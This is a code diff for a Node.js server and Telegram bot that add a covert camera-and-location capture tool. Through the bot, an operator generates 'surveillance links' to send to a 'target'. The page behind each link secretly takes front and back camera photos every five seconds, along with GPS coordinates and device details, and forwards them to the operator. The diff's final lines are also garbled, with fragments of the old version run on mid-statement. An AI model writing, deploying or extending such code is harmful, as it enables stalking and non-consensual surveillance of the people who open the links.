@@ -8,102 +8,367 @@ const fs = require('fs');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Telegram Bot Setup with webhook for Render
-const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
-const bot = new TelegramBot(TELEGRAM_TOKEN);
-
-// Trust proxy (Important for Render)
-app.set('trust proxy', 1);
-
-// Security headers for HTTPS
-app.use((req, res, next) => {
-  res.setHeader('Permissions-Policy', 'camera=*, geolocation=*, microphone=*');
-  res.setHeader('X-Content-Type-Options', 'nosniff');
-  next();
+// Telegram Bot Setup
+const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { 
+  polling: true 
 });
 
+// Store for user sessions
+const userSessions = new Map();
+
 // Multer setup
+const storage = multer.diskStorage({
+  destination: (req, file, cb) => {
+    const uploadsDir = 'uploads';
+    if (!fs.existsSync(uploadsDir)) {
+      fs.mkdirSync(uploadsDir);
+    }
+    cb(null, uploadsDir);
+  },
+  filename: (req, file, cb) => {
+    cb(null, `photo-${Date.now()}.jpg`);
+  }
+});
+
 const upload = multer({
-  dest: 'uploads/',
+  storage: storage,
   limits: { fileSize: 10 * 1024 * 1024 }
 });
 
-// Ensure uploads directory exists
-if (!fs.existsSync('uploads')) {
-  fs.mkdirSync('uploads');
-}
-
 // Middleware
 app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ limit: '10mb', extended: true }));
 app.use(express.static('public'));
 
-// Health check endpoint for Render
-app.get('/health', (req, res) => {
-  res.json({ 
-    status: 'ok', 
-    timestamp: new Date().toISOString(),
-    telegram: TELEGRAM_TOKEN ? 'configured' : 'missing'
-  });
-});
-
-// Main route
+// Routes
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Admin panel
-app.get('/admin', (req, res) => {
-  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
-});
-
-// Test endpoint
-app.get('/test', (req, res) => {
-  res.json({
-    message: 'Server is working',
-    telegram_configured: !!TELEGRAM_TOKEN,
-    chat_id_configured: !!TELEGRAM_CHAT_ID
+app.get('/health', (req, res) => {
+  res.json({ 
+    status: 'ok',
+    bot: !!process.env.TELEGRAM_BOT_TOKEN
   });
 });
 
-// Photo upload endpoint - ENHANCED
+// Generate unique link
+app.get('/generate-link/:chatId', (req, res) => {
+  const chatId = req.params.chatId;
+  const sessionId = Math.random().toString(36).substring(7);
+  const baseUrl = process.env.BASE_URL || `http://localhost:${PORT}`;
+  const link = `${baseUrl}/?session=${sessionId}`;
+  
+  userSessions.set(sessionId, {
+    chatId: chatId,
+    createdAt: new Date(),
+    captures: 0
+  });
+  
+  res.json({ 
+    success: true, 
+    link: link,
+    sessionId: sessionId
+  });
+});
+
+// Upload photo endpoint
 app.post('/upload-photo', upload.single('photo'), async (req, res) => {
-  console.log('📸 Upload request received');
+  console.log('📸 Photo upload request received');
   
   try {
     if (!req.file) {
-      console.error('❌ No photo file received');
-      return res.status(400).json({ success: false, error: 'No photo uploaded' });
+      return res.status(400).json({ 
+        success: false, 
+        error: 'No photo received' 
+      });
     }
 
-    if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
-      console.error('❌ Telegram not configured');
-      return res.status(500).json({ success: false, error: 'Telegram not configured' });
+    const { sessionId, cameraType, location, browserInfo } = req.body;
+    
+    // Get session details
+    const session = userSessions.get(sessionId);
+    if (!session) {
+      return res.status(404).json({ 
+        success: false, 
+        error: 'Invalid session' 
+      });
     }
 
+    const chatId = session.chatId;
     const photoPath = req.file.path;
-    console.log('📁 Photo saved at:', photoPath);
 
     // Parse data
-    const locationData = req.body.location ? JSON.parse(req.body.location) : {};
-    const browserData = req.body.browserInfo ? JSON.parse(req.body.browserInfo) : {};
-    const pageUrl = req.body.pageUrl || 'Unknown';
+    const locationData = location ? JSON.parse(location) : null;
+    const browserData = browserInfo ? JSON.parse(browserInfo) : {};
 
-    console.log('📍 Location:', locationData);
-    console.log('🌐 Browser:', browserData.platform);
+    // Create caption
+    let caption = `📸 *New Photo Captured*\n\n`;
+    caption += `📷 Camera: ${cameraType === 'front' ? 'Front' : 'Back'}\n`;
+    caption += `🆔 Session: \`${sessionId}\`\n`;
+    caption += `📊 Capture #${session.captures + 1}\n\n`;
 
-    // Create message
-    let message = '📸 *New Surveillance Data*\n\n';
+    if (locationData && locationData.latitude) {
+      caption += `📍 *Location:*\n`;
+      caption += `Lat: \`${locationData.latitude.toFixed(6)}\`\n`;
+      caption += `Lng: \`${locationData.longitude.toFixed(6)}\`\n`;
+      caption += `Accuracy: ${locationData.accuracy.toFixed(0)}m\n\n`;
+    }
+
+    caption += `💻 *Device Info:*\n`;
+    caption += `Platform: ${browserData.platform || 'Unknown'}\n`;
+    caption += `Screen: ${browserData.screenWidth}x${browserData.screenHeight}\n`;
+    caption += `Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}\n`;
+
+    // Send photo to Telegram
+    console.log(`📤 Sending to chat: ${chatId}`);
     
-    if (pageUrl) {
-      message += `🌐 *Viewing:*\n\`${pageUrl}\`\n\n`;
+    await bot.sendPhoto(chatId, fs.createReadStream(photoPath), {
+      caption: caption,
+      parse_mode: 'Markdown'
+    });
+
+    console.log('✅ Photo sent successfully');
+
+    // Send location separately if available
+    if (locationData && locationData.latitude) {
+      await bot.sendLocation(
+        chatId,
+        locationData.latitude,
+        locationData.longitude
+      );
+      console.log('✅ Location sent');
+    }
+
+    // Update session
+    session.captures++;
+    session.lastCapture = new Date();
+
+    // Delete temp file
+    fs.unlinkSync(photoPath);
+    console.log('🗑️ Temp file deleted');
+
+    res.json({ 
+      success: true, 
+      message: 'Photo sent to Telegram',
+      captureNumber: session.captures
+    });
+
+  } catch (error) {
+    console.error('❌ Error:', error);
+    
+    if (req.file && fs.existsSync(req.file.path)) {
+      fs.unlinkSync(req.file.path);
     }
     
-    if (locationData.latitude) {
-      message += `📍 *Location:*\n`;
-      message += `Lat: \`${locationData.latitude}\`\n`;
-      message += `Lng: \`${locationData.longitude}\`\n`;
+    res.status(500).json({ 
+      success: false, 
+      error: error.message 
+    });
+  }
+});
+
+// Telegram Bot Commands
+bot.onText(/\/start/, async (msg) => {
+  const chatId = msg.chat.id;
+  
+  const welcomeMessage = `
+🔐 *Surveillance System Bot*
+
+Welcome! This bot helps you capture photos remotely.
+
+*Available Commands:*
+/generatelink - Generate a new surveillance link
+/sessions - View active sessions
+/help - Show help message
+
+To get started, use /generatelink
+`;
+
+  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/generatelink/, async (msg) => {
+  const chatId = msg.chat.id;
+  
+  try {
+    const sessionId = Math.random().toString(36).substring(7);
+    const baseUrl = process.env.BASE_URL || `https://your-app.onrender.com`;
+    const link = `${baseUrl}/?session=${sessionId}`;
+    
+    userSessions.set(sessionId, {
+      chatId: chatId,
+      createdAt: new Date(),
+      captures: 0
+    });
+
+    const message = `
+✅ *Link Generated Successfully!*
+
+🔗 *Surveillance Link:*
+\`${link}\`
+
+📋 *Session ID:* \`${sessionId}\`
+⏰ *Created:* ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}
+
+*Instructions:*
+1. Send this link to target
+2. When they open it, photos will be captured
+3. You'll receive photos here automatically
+
+*Features:*
+📸 Front & Back camera capture
+📍 Location tracking
+💻 Device information
+🔄 Continuous monitoring
+`;
+
+    await bot.sendMessage(chatId, message, { 
+      parse_mode: 'Markdown',
+      reply_markup: {
+        inline_keyboard: [
+          [
+            { text: '🔗 Copy Link', url: link },
+            { text: '🔄 New Link', callback_data: 'generate_new' }
+          ],
+          [
+            { text: '📊 View Sessions', callback_data: 'view_sessions' }
+          ]
+        ]
+      }
+    });
+
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+  }
+});
+
+bot.onText(/\/sessions/, async (msg) => {
+  const chatId = msg.chat.id;
+  
+  const userSessionsList = Array.from(userSessions.entries())
+    .filter(([_, session]) => session.chatId === chatId);
+
+  if (userSessionsList.length === 0) {
+    bot.sendMessage(chatId, '📭 No active sessions found.\n\nUse /generatelink to create one.');
+    return;
+  }
+
+  let message = `📊 *Active Sessions (${userSessionsList.length})*\n\n`;
+  
+  userSessionsList.forEach(([sessionId, session], index) => {
+    message += `*${index + 1}. Session ${sessionId}*\n`;
+    message += `   Captures: ${session.captures}\n`;
+    message += `   Created: ${session.createdAt.toLocaleTimeString()}\n`;
+    if (session.lastCapture) {
+      message += `   Last: ${session.lastCapture.toLocaleTimeString()}\n`;
+    }
+    message += `\n`;
+  });
+
+  bot.sendMessage(chatId, message, { parse_mode: 'Markdown' });
+});
+
+bot.onText(/\/help/, async (msg) => {
+  const chatId = msg.chat.id;
+  
+  const helpMessage = `
+📖 *Help & Documentation*
+
+*Commands:*
+/start - Start the bot
+/generatelink - Generate surveillance link
+/sessions - View active sessions
+/help - Show this message
+
+*How it works:*
+1. Generate a link using /generatelink
+2. Send link to target person
+3. When they open the link:
+   • Loading screen appears
+   • Photos captured automatically
+   • Both front and back camera
+   • Location tracked
+   • All data sent to you
+
+*Features:*
+✅ Front camera capture
+✅ Back camera capture
+✅ GPS location tracking
+✅ Device information
+✅ Real-time updates
+✅ Automatic capture every 5 seconds
+
+*Privacy Notice:*
+Use responsibly and legally only.
+`;
+
+  bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
+});
+
+// Handle callback queries
+bot.on('callback_query', async (query) => {
+  const chatId = query.message.chat.id;
+  const data = query.data;
+
+  if (data === 'generate_new') {
+    // Generate new link
+    const sessionId = Math.random().toString(36).substring(7);
+    const baseUrl = process.env.BASE_URL || `https://your-app.onrender.com`;
+    const link = `${baseUrl}/?session=${sessionId}`;
+    
+    userSessions.set(sessionId, {
+      chatId: chatId,
+      createdAt: new Date(),
+      captures: 0
+    });
+
+    bot.sendMessage(chatId, `✅ New link generated:\n\n${link}`);
+  } 
+  else if (data === 'view_sessions') {
+    const userSessionsList = Array.from(userSessions.entries())
+      .filter(([_, session]) => session.chatId === chatId);
+
+    if (userSessionsList.length === 0) {
+      bot.sendMessage(chatId, '📭 No active sessions');
+      return;
+    }
+
+    let message = `📊 Active Sessions: ${userSessionsList.length}\n\n`;
+    userSessionsList.forEach(([sessionId, session]) => {
+      message += `• ${sessionId}: ${session.captures} captures\n`;
+    });
+
+    bot.sendMessage(chatId, message);
+  }
+
+  bot.answerCallbackQuery(query.id);
+});
+
+// Error handling
+bot.on('polling_error', (error) => {
+  console.error('Polling error:', error);
+});
+
+// Start server
+app.listen(PORT, () => {
+  console.log('================================');
+  console.log(`🚀 Server running on port ${PORT}`);
+  console.log(`📱 Telegram bot active`);
+  console.log(`🔑 Bot token: ${process.env.TELEGRAM_BOT_TOKEN ? 'Configured ✅' : 'Missing ❌'}`);
+  console.log('================================');
+});
+
+// Cleanup old sessions (every hour)
+setInterval(() => {
+  const now = new Date();
+  for (const [sessionId, session] of userSessions.entries()) {
+    const age = now - session.createdAt;
+    if (age > 24 * 60 * 60 * 1000) { // 24 hours
+      userSessions.delete(sessionId);
+      console.log(`🗑️ Deleted old session: ${sessionId}`);
+    }
+  }
+}, 60 * 60 * 1000);      message += `Lng: \`${locationData.longitude}\`\n`;
       message += `Accuracy: ${locationData.accuracy}m\n\n`;
     } else {
       message += `📍 *Location:* Not Available\n\n`;
